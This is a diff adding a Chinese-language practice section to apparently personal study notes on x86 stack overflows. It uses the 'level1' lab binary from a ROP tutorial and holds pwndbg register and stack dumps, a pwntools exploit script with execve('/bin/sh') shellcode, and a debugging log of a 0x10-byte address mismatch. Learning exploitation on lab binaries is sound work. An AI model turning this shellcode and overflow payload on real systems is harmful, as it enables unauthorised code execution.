@@ -153,3 +153,103 @@ ebp+8 | 3
 07:001c│ ebp  0xffffd008 ◂— 0x0
 ```
 顺利结束
+
+## practice
+我们简单使用**一步一步学ROP之linux_x86篇**的level1简单练习一下exp只需要改一下ret就行,我们找一下使用cyclic生成字符串后贴到里边,找到$esp-144,得到
+```
+─────────────────────────────────[ REGISTERS ]──────────────────────────────────
+ EAX  0xc9
+ EBX  0x0
+ ECX  0xffffcfb0 ◂— 0x61616161 ('aaaa')
+ EDX  0x100
+ EDI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+ ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+ EBP  0x6261616a ('jaab')
+ ESP  0xffffd040 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+ EIP  0x6261616b ('kaab')
+───────────────────────────────────[ DISASM ]───────────────────────────────────
+Invalid address 0x6261616b
+
+
+
+
+
+
+
+
+
+
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp  0xffffd040 ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+01:0004│      0xffffd044 ◂— 'maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+02:0008│      0xffffd048 ◂— 'naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+03:000c│      0xffffd04c ◂— 'oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+04:0010│      0xffffd050 ◂— 'paabqaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+05:0014│      0xffffd054 ◂— 'qaabraabsaabtaabuaabvaabwaabxaabyaab\n'
+06:0018│      0xffffd058 ◂— 'raabsaabtaabuaabvaabwaabxaabyaab\n'
+07:001c│      0xffffd05c ◂— 'saabtaabuaabvaabwaabxaabyaab\n'
+```
+可见是`0xffffd040-144`,所以直接填到里边,exp如下
+```
+
+from pwn import *
+
+p = process('./level1')
+
+ret = 0xffffd040-144
+
+# execve ("/bin/sh") 
+# xor ecx, ecx
+# mul ecx
+# push ecx
+# push 0x68732f2f   ;; hs//
+# push 0x6e69622f   ;; nib/
+# mov ebx, esp
+# mov al, 11
+# int 0x80
+
+shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
+shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
+shellcode += "\x0b\xcd\x80"
+
+payload =  shellcode + 'A' * (140 - len(shellcode))   + p32(ret)
+
+p.send(payload)
+
+p.interactive()
+```
+但是在实际运行时发生错误,发现竟然相差0x10个字节,ret是0xffffd040-144,我并不知道为什么
+```
+───────────────────────────────────[ STACK ]────────────────────────────────────
+00:0000│ esp  0xffffd050 —▸ 0xf7fb03dc (__exit_funcs) —▸ 0xf7fb11e0 (initial) ◂— 0x0
+01:0004│      0xffffd054 —▸ 0x80481fc ◂— add    byte ptr cs:[eax], al /* '.' */
+02:0008│      0xffffd058 —▸ 0x8048469 (__libc_csu_init+9) ◂— add    ebx, 0x1b8b
+03:000c│      0xffffd05c ◂— 0x0
+04:0010│      0xffffd060 —▸ 0xf7fb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
+... ↓
+06:0018│      0xffffd068 ◂— 0x0
+07:001c│      0xffffd06c —▸ 0xf7e16637 (__libc_start_main+247) ◂— add    esp, 0x10
+─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
+ ► f 0 ffffcfb0
+────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/32gx $esp-144
+0xffffcfc0:	0x2f2f6851e1f7c931	0x896e69622f686873
+0xffffcfd0:	0x41414180cd0bb0e3	0x4141414141414141
+0xffffcfe0:	0x4141414141414141	0x4141414141414141
+0xffffcff0:	0x4141414141414141	0x4141414141414141
+0xffffd000:	0x4141414141414141	0x4141414141414141
+0xffffd010:	0x4141414141414141	0x4141414141414141
+0xffffd020:	0x4141414141414141	0x4141414141414141
+0xffffd030:	0x4141414141414141	0x4141414141414141
+0xffffd040:	0x4141414141414141	0xffffcfb041414141
+0xffffd050:	0x080481fcf7fb03dc	0x0000000008048469
+0xffffd060:	0xf7fb0000f7fb0000	0xf7e1663700000000
+0xffffd070:	0xffffd10400000001	0x00000000ffffd10c
+0xffffd080:	0x0000000000000000	0xf7ffdc04f7fb0000
+0xffffd090:	0x00000000f7ffd000	0xf7fb0000f7fb0000
+0xffffd0a0:	0x762412ab00000000	0x000000004b4f1cbb
+0xffffd0b0:	0x0000000000000000	0x0804835000000001
+pwndbg> p $esp
+$1 = (void *) 0xffffd050
+```
+今天努力分析一下原因吧,虽然也能调出来,但是这佛系bug让我属实难以接受
